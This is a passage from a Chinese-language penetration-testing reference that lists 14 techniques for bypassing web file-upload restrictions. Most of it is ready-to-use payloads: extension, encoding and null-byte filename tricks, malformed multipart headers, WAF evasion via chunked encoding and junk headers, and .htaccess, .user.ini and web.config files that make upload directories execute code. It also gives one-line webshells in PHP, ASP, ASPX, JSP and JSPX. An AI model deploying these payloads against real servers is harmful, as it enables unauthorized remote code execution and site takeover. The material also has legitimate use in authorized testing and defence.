## 三、14种绕过策略深度详解

### 策略1：后缀绕过（Suffix Bypass）

服务端通过文件扩展名黑名单/白名单判断是否可上传。

**1.1 可执行扩展名变体（中间件解析特性）：**
| 语言 | 可解析罕见后缀 |
|------|--------------|
| PHP | `.php3 .php4 .php5 .phtml .pht .phar .phps .pgif .php1 .php2 .php6 .php7 .phtm .phpt .pgif .inc` |
| ASP | `.asa .cer .cdx .htr .asax .ascx .ashx .asmx .aspq .axd .rem .soap .cshtml .vbhtml` |
| ASP.NET | `.ashx .asmx .asax .ascx .soap .rem .axd .cshtm .vbhtm` |
| JSP | `.jspx .jspf .jsw .jsv .jtml .jspa .wss .do .action` |
| Perl | `.pl .pm .cgi` |
| Python | `.py .pyc .pyd .wsgi` |

**1.2 大小写变体（Windows/IIS不区分大小写）：**
```
.pHp .PhP .pHP .pHp .PHP .phP
.aSp .AsP .ASP .Asp .aSP
.JsP .jSp .JSP .Jsp .jSP
```

**1.3 双写绕过（一次性替换删除）：**
```
pphphp → 删除中间php后剩php
phphpp → 同上逻辑
aspasp / aasps / aspxaspx
jspjsp / jjsps
.pphphp → 双重替换
```
适用：代码使用`str_replace("php","",$name)`等单次替换

**1.4 空字节截断（老版本）：**
```
shell.php%00.jpg     URL编码空字节
shell.php\x00.jpg   十六进制空字节
shell.php%00        末尾截断
shell.php%2500.jpg  双重URL编码
%00截断利用条件：PHP < 5.3.4 且 magic_quotes_gpc=Off；老版本Java Servlet
```

**1.5 双扩展名顺序错位：**
```
shell.php.jpg     Apache从右向左解析/.jpg未识别则左移解析.php
shell.jpg.php     若服务端只检查第一个扩展名
shell.php.png / shell.png.php
shell.php%00.jpg  配合空字节
shell.php;.jpg    IIS 6.0分号解析
shell.jpg/.php    路径分隔符绕过
```

**1.6 尾部特殊字符（Windows特性）：**
```
shell.php.        尾点（Windows保存时自动去除）
shell.php         尾空格（Windows自动去除）
shell.php. .      多点多空格
shell.php..       双点
shell.php%20      URL编码空格
shell.php%00.%20  复合
Windows + IIS环境；代码未递归rtrim
```

**1.7 NTFS ADS交换数据流（Windows特性）：**
```
shell.php::$DATA          NTFS默认数据流
shell.php:$DATA           变体
shell.php::$INDEX_ALLOCATION
shell.php::$DATA......    多点尾部
Windows访问原文件，但黑名单匹配到::认为无扩展名
```

**1.8 IIS分号解析漏洞（IIS 6.0）：**
```
shell.asp;.jpg
shell.asp;.png
shell.asp;jpg
shell.php;.jpg（特定配置）
IIS 6.0中分号后视为查询参数，实际解析.asp
配合畸形目录：/test.asp/1.jpg → test.asp被当作脚本执行
```

**1.9 路径分隔符欺骗：**
```
shell.php/.jpg
shell.php\.jpg
shell.php%2f.jpg   /编码
shell.php%5c.jpg   \编码
../shell.php       路径穿越（若保存路径拼接）
```

**1.10 URL编码片段：**
```
p%68p          %68=h → php
%70hp          %70=p → php
ph%70          %70=p
shell.%70hp    %70=p
p%68%70        全编码
%2570hp        双重编码（WAF一次decode得%70hp，后端二次得php）
```

**1.11 扩展名中间插入特殊字符：**
```
p;hp / p hp / ph p / p.hp / p%20hp
a;sp / as p / a.sp / a%20sp
j;sp / js p / j.sp / j%20sp
若代码使用==或in做严格后缀匹配而非endswith()
```

---

### 策略2：Content-Disposition头操控（Multipart解析差异）

利用WAF/代理与应用服务器对multipart头部解析的差异（Parser Differential）。

**2.1 头名大小写变形：**
```http
content-disposition: form-data; name="file"; filename="shell.php"
CONTENT-DISPOSITION: form-data; name="file"; filename="shell.php"
Content-disposition: form-data; name="file"; filename="shell.php"
ConTENT-DisPoSition: form-data; name="file"; filename="shell.php"
```

**2.2 冒号后空格变形：**
```http
Content-Disposition:form-data; name="file"; filename="shell.php"     (去空格)
Content-Disposition:  form-data; name="file"; filename="shell.php"   (双空格)
Content-Disposition:	form-data; name="file"; filename="shell.php"  (Tab)
```

**2.3 form-data值变形：**
```http
Content-Disposition: Form-Data; name="file"; filename="shell.php"
Content-Disposition: FORM-DATA; name="file"; filename="shell.php"
Content-Disposition: form-datA; name="file"; filename="shell.php"
Content-Disposition: f+orm-data; name="file"; filename="shell.php"
Content-Disposition: AAAA="BBBB"; name="file"; filename="shell.php"
Content-Disposition: form-data;;;;;;;;;; name="file"; filename="shell.php"
Content-Disposition: name="file"; filename="shell.php"  （删除form-data）
```

**2.4 引号变化：**
```http
Content-Disposition: form-data; name=file; filename=shell.php         (无引号)
Content-Disposition: form-data; name='file'; filename='shell.php'     (单引号)
Content-Disposition: form-data; name=`file`; filename=`shell.php`     (反引号)
```

**2.5 未闭合引号：**
```http
Content-Disposition: form-data; name="file"; filename="shell.php
Content-Disposition: form-data; name="file"; filename='shell.php
Content-Disposition: form-data; name="file"; filename="shell.php'
```

**2.6 多等号：**
```http
Content-Disposition: form-data; name=="file"; filename=="shell.php"
Content-Disposition: form-data; name==="file"; filename==="shell.php"
Content-Disposition: form-data; name="file"; filename======================================"shell.php"
```

**2.7 换行注入：**
```http
Content-Disposition: form-data; name="file"; filename="shell.php"

Content-Disposition: form-data; name="file"
filename="shell.php"

Content-Disposition: form-data; name="file"; filename=
"shell.php"
```

**2.8 HPP参数污染：**
```http
Content-Disposition: form-data; name="file"; filename="safe.jpg"; filename="shell.php"
Content-Disposition: form-data; name="file"; filename="shell.php"; filename="safe.jpg"
Content-Disposition: form-data; name="file"; filename= ;filename="shell.php"
Content-Disposition: form-data; name="file"; filename="";filename="shell.php"
（WAF取第一个safe.jpg，应用取最后一个shell.php）
```

**2.9 反斜杠/多分号污染：**
```http
Content-Disposition: form-data; name="file"; filename="shell\php"
Content-Disposition: form-data;;;;; name="file";;;;;;;;; filename="shell.php"
Content-Disposition: form-data; name="file";;;;;;;;;;;;;;;;;;;;;;;;;;;;;; filename="shell.php"
```

---

### 策略3：Content-Type绕过

**3.1 MIME类型伪装：**
```http
# 图片MIME（白名单image/*场景）
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: image/bmp
Content-Type: image/webp
Content-Type: image/svg+xml
Content-Type: image/tiff

# 通用/模糊MIME
Content-Type: text/plain
Content-Type: text/html
Content-Type: application/octet-stream

# 直接声明可执行类型（测试是否未拦截）
Content-Type: application/x-httpd-php
Content-Type: application/x-php
Content-Type: application/x-asp

# 伪造前缀匹配
Content-Type: image/php       （若代码只匹配image/前缀）
Content-Type: image/asp
Content-Type: image/aspx
Content-Type: image/jsp

# URL编码MIME
Content-Type: image%2Fgif
Content-Type: image%2Fjpeg
Content-Type: image%2Fphp

# 空/删除Content-Type
Content-Type: 
（删除Content-Type头）
```

**3.2 大小写/空格变形：**
```http
content-type: image/jpeg
CONTENT-TYPE: IMAGE/JPEG
Content-Type:image/jpeg       (去空格)
Content-Type:  image/jpeg     (双空格)
```

**3.3 双Content-Type头：**
```http
Content-Type: image/gif
Content-Type: application/x-httpd-php
（RFC规定同名头应合并/后者覆盖；不同服务器处理不同）
```

---

### 策略4：Windows特性利用

| 技术 | Payload | 原理 |
|------|---------|------|
| NTFS ADS | `shell.php::$DATA`、`shell.php:$DATA` | NTFS数据流属性，Windows剥离后访问原文件 |
| IIS 6.0分号 | `shell.asp;.jpg` | 分号后视为查询参数 |
| Windows保留设备名 | `con.php`、`aux.php`、`nul.php`、`prn.php`、`com1.php`、`com2.php`、`lpt1.php` | 不允许保存，可能触发异常/兜底逻辑 |
| 尾部点/空格 | `shell.php.`、`shell.php ` | Windows自动去除 |

**利用条件：** Windows服务器 + IIS（尤其IIS 6.0/7.0/7.5经典模式）

---

### 策略5：Linux/Apache/Nginx特性利用

| 技术 | Payload | 原理 |
|------|---------|------|
| Apache多扩展名解析 | `shell.php.jpg`、`shell.php.png` | AddHandler配置含.php则任何位置有.php就解析 |
| Nginx解析漏洞 | `shell.jpg/.php`、`shell.jpg%00.php` | 老版Nginx错误配置导致php解析 |
| Nginx文件名逻辑漏洞(CVE-2013-4547) | `shell.jpg%00.php`（空格+\0+php）| 路径处理错误 |
| Apache换行解析(CVE-2017-15715) | `shell.php%0a` | 6d2d7426版本mod_php换行绕过 |
| 路径穿越 | `../shell.php`、`....//shell.php` | `....//`绕过一次性删除../ |
| 隐藏文件 | `.shell.php` | Linux.开头隐藏文件，绕过列目录检查 |
| Apache HTTPD CVE-2021-41773/42013 | 路径穿越+CGI执行 | 2.4.49/2.4.50 |

---

### 策略6：魔术字节伪造（Magic Bytes）

服务端通过读取文件头字节判断文件类型（getimagesize()、file命令）。

**常用魔术字节表：**
| 文件类型 | 魔术字节(Hex) | 字符表示 |
|---------|-------------|---------|
| JPG | `FF D8 FF E0` | `\xff\xd8\xff\xe0` |
| JPG(EXIF) | `FF D8 FF E1` | `\xff\xd8\xff\xe1` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `\x89PNG\r\n\x1a\n` |
| GIF89a | `47 49 46 38 39 61` | `GIF89a` |
| GIF87 | `47 49 46 38 37 61` | `GIF87a` |
| BMP | `42 4D` | `BM` |
| PDF | `25 50 44 46 2D 31 2E 35` | `%PDF-1.5` |
| ZIP | `50 4B 03 04` | `PK\x03\x04` |
| RAR | `52 61 72 21 1A 07` | `Rar!\x1a\x07` |
| 7Z | `37 7A BC AF 27 1C` | `7z\xbc\xaf'\x1c` |
| WAV | `52 49 46 46` | `RIFF` |
| MP3 | `49 44 33` | `ID3` |

**Payload结构（图片马）：**
```
Content-Type: image/jpeg

[GIF89a]<?php @eval($_POST["cmd"]); ?>

或
Content-Type: image/png

[\x89PNG\r\n\x1a\n]<?php @eval($_POST["cmd"]); ?>
```

**关键注意：**
- 魔术字节只插入到Content-Type头之后的文件内容开头
- 文件扩展名仍改为.php/.jsp等可执行后缀
- 若开启图片二次渲染（GD库处理），普通图片马可能失效，需将代码注入到图片的EXIF/注释等不被渲染破坏的位置
- 配合文件包含漏洞使用时扩展名可以是.jpg

---

### 策略7：空字节注入

**空字节编码变体：**
```
%00           URL编码空字节
\0            C风格转义
\x00          十六进制空字节
原始\x00字节   二进制0
%2500         双重URL编码
%u0000        Unicode空字节（Java/.NET）
```

**截断位置组合：**
```
shell.php%00.jpg     可执行扩展名和白名单扩展名之间
shell.php%00jpg      无点号
shell%00.php         文件名和扩展名之间
shell.php%00.        末尾截断
```

**利用条件：**
- PHP < 5.3.4 且 magic_quotes_gpc=Off
- 旧版Java Servlet容器
- C/C++编写的原生模块

---

### 策略8：编码绕过

**8.1 URL编码扩展名：**
```
shell.%70%68%70    (=php)
shell.%61%73%70    (=asp)
shell.%6a%73%70    (=jsp)
shell.%61%73%70%78 (=aspx)
```

**8.2 双重URL编码：**
```
shell.%2570%2568%2570    (decode一次→%70%68%70→两次→php)
```

**8.3 MIME编码（RFC 2047）：**
```
=?utf-8?B?c2hlbGwucGhw?=     (B编码Base64 = shell.php)
=?utf-8?Q?shell=2Ephp?=      (Q编码Quoted-Printable)
```

**8.4 Unicode等价字符：**
```
shell.ph\x70       (\x70='p')
shell.p\u0068p     (\u0068='h')
利用Unicode归一化(NFC/NFD)，ASCII等价字符被归一化
```

**8.5 罕见编码：**
```
%u0070%u0068%u0070     Unicode编码(=php)
%uff05%u0070           全角百分号+编码
```

---

### 策略9：WAF绕过（流量层）

**9.1 超长文件名：**
```
AAAAAAAAA...(200-5000个A)...A.php
触发WAF缓冲区截断/溢出；某些WAF只检查前N个字节，超过后放过
```

**9.2 多点/特殊文件名：**
```
shell.....php
shell.php..................
shell.p.h.p
```

**9.3 垃圾头注入：**
```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
X-Junk: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...(500-5000个A)
X-Decoy: aaa
X-Filler: bbb...

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php phpinfo(); ?>
------WebKitFormBoundary--
```

**9.4 Transfer-Encoding: chunked（分块编码）：**
```http
POST /upload HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

1f
------WebKitFormBoundary
1a
Content-Disposition: form-data
15
; name="file"; filename=
9
"shell.php
17
"
Content-Type: image/jpeg

0

（分块编码；某些WAF不完整支持chunked解码，看到的是分块长度行而非真实内容）
```

**9.5 双重Content-Disposition：**
```http
Content-Disposition: form-data; name="decoy"; filename="safe.jpg"
Content-Disposition: form-data; name="file"; filename="shell.php"
（WAF取第一个safe.jpg放行，应用取第二个）
```

**9.6 Boundary注入：**
```
boundary=----WebKitFormBoundary; shell.php
boundary=---------------------------shell.php
boundary=----WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.jpg"; name="file"; filename="shell.php"
```

**9.7 大文件前缀填充：**
在恶意内容前填充大量合法内容（如图片数据/正常文本），让WAF扫描只检测前N字节而放过后面的恶意代码。

---

### 策略10：配置文件上传（将上传目录变为执行点）

若能上传到Web可访问目录且服务器会解析配置文件，可将图片上传目录变成代码执行点。

**10.1 Apache .htaccess：**
```apache
# 将当前目录所有文件交给PHP解析
SetHandler application/x-httpd-php

# 让特定图片扩展名被PHP解析
AddType application/x-httpd-php .jpg .png .gif

# 通配所有文件作为PHP
<FilesMatch ".*">
SetHandler application/x-httpd-php
</FilesMatch>

# 启用CGI执行
Options +ExecCGI
AddHandler cgi-script .jpg
```

**利用链：**
```
1. 上传.htaccess（SetHandler application/x-httpd-php）
2. 上传shell.jpg（内容<?php eval($_POST[cmd]); ?>）
3. 访问 http://target/upload/shell.jpg → 执行PHP
```

**10.2 PHP .user.ini（CGI/FastCGI模式）：**
```ini
; 每个PHP文件执行前自动include指定文件
auto_prepend_file=shell.gif
auto_append_file=shell.gif
```

**利用链：**
```
1. 上传.user.ini（auto_prepend_file=shell.gif）
2. 上传shell.gif（GIF89a + <?php phpinfo(); ?>）
3. 访问该目录下任意.php文件 → 自动include shell.gif执行
```

**10.3 IIS web.config：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="shelljpg" path="*.jpg" verb="*" modules="IsapiModule" 
           scriptProcessor="%windir%\Microsoft.NET\Framework\v4.0.30319\aspnet_isapi.dll" 
           resourceType="Unspecified" preCondition="classicMode,runtimeVersionv4.0,bitness32"/>
    </handlers>
  </system.webServer>
</configuration>
```

**10.4 Nginx配置错误（非上传文件，但需检测）：**
- `cgi.fix_pathinfo=1`导致任意文件作为PHP解析
- Nginx + Apache后端解析差异

**利用前提：**
1. 上传目录必须是Web可访问目录
2. AllowOverride All（对.htaccess）
3. PHP以CGI/FastCGI运行（对.user.ini）
4. IIS允许web.config覆盖
5. 配置文件未被黑名单拦截（需要配合策略1-9绕过）

---

### 策略11：WebShell内容注入

**11.1 最小一句话WebShell（各语言）：**

**PHP：**
```php
<?php @eval($_POST["cmd"]); ?>
<?php @system($_REQUEST["cmd"]); ?>
<?= `$_GET[0]`; ?>                                      短标签+反引号
<?php $_GET[a]($_GET[b]); ?>                            可变函数 (a=system&b=whoami)
<?php assert($_POST["cmd"]); ?>                         assert（PHP 7.1前）
<?php @preg_replace('/./e',$_POST['cmd'],''); ?>        preg_replace /e修饰符
<?php @call_user_func($_POST['f'],$_POST['p']); ?>      回调函数
<?php @array_map($_GET['f'],array($_GET['p'])); ?>      array_map
<?php include($_GET['f']); ?>                           文件包含
```

**ASP：**
```asp
<%eval request("cmd")%>
<%execute request("cmd")%>
<%ExecuteGlobal request("cmd")%>
<%eval request(chr(99)&chr(109)&chr(100))%>            chr拼接
<%Set o=Server.CreateObject("WScript.Shell"):o.Exec("cmd /c "&request("cmd"))%>
```

**ASPX：**
```aspx
<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%Process.Start("cmd.exe","/c "+Request["cmd"]);%>
<%@ Page Language="C#" %><%System.Reflection.Assembly.Load(Convert.FromBase64String(Request["b"])).CreateInstance("X").Equals(null);%>
```

**JSP：**
```jsp
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
<%=Runtime.getRuntime().exec(request.getParameter("cmd"))%>
<%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));java.io.InputStream in=p.getInputStream();int a;while((a=in.read())!=-1){out.print((char)a);}%>
```

**JSPX：**
```jspx
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page"><jsp:directive.page contentType="text/html"/><jsp:scriptlet>Runtime.getRuntime().exec(request.getParameter("cmd"));</jsp:scriptlet></jsp:root>
```

**11.2 双重Payload结构（图片马）：**
每种魔术字节（6种）×每种WebShell（5种语言）=30种组合，同时绕过内容检测和扩展名/MIME检测。

---

### 策略12：特殊字符注入

在文件名中插入特殊字符，测试边界情况和解析器异常处理。

**字符集：**
```
空白符：空格 \t \n \r
Windows非法文件名字符：/ \ : * ? " < > |
Shell/URL元字符：; & $ ` ' # @ ! ^ % ( ) [ ] { }
```

**注入位置：**
```
1. 扩展名前：shell{char}php
2. 扩展名后：shell.php{char}
3. 扩展名中间：ph{char}p / sh{char}ell.php
4. 文件名与点之间：shell{char}.php
5. 点后空格：shell. php
6. 多点：shell...php / shell.....php
```

**目标效果：**
- 正则匹配失败（尾字符干扰`\.(php|asp)$`）
- 触发数据库/文件系统异常进入兜底分支
- 触发XSS/SQLi次要漏洞（文件名回显场景）
- endswith()/split('.')产生非预期结果

---

### 策略13：大小写变换

系统生成大小写变体绕过严格匹配：
```
php  → php PHP Php phP pHp pHP PhP
asp  → asp ASP Asp aSp AsP aSP
aspx → aspx ASPX Aspx aSpx AsPx aSPx asPx aSpX ASPx
jsp  → jsp JSP Jsp jSp jsP jSP JsP JSp
```

利用场景：
- Windows/IIS（大小写不敏感）：绕过严格小/大写黑名单
- Linux/Apache：若handler配置成了*.PHP也能生效
- Nginx：`location ~*\.php$`大小写不敏感匹配

---

### 策略14：双/多扩展名

**白名单扩展名池：** jpg/jpeg/png/gif/bmp/txt/pdf/doc/xls/zip/rar

**组合模式：**
| 模式 | 示例 | 利用点 |
|------|------|--------|
| 可执行在前，白名单在后 | `shell.php.jpg` | Apache从右向左解析，未知扩展名左移 |
| 白名单在前，可执行在后 | `shell.jpg.php` | 服务端只检查第一个扩展名 |
| 三扩展名 | `shell.jpg.php.jpg` | 头尾白名单，中间.php绕过检查 |
| Nginx老漏洞 | `shell.jpg/shell.php`、`shell.jpg%00.php` | Nginx解析错误 |
| Apache HTTPD | `shell.php.jpg` (AddHandler) | 任意位置含.php即解析 |

---

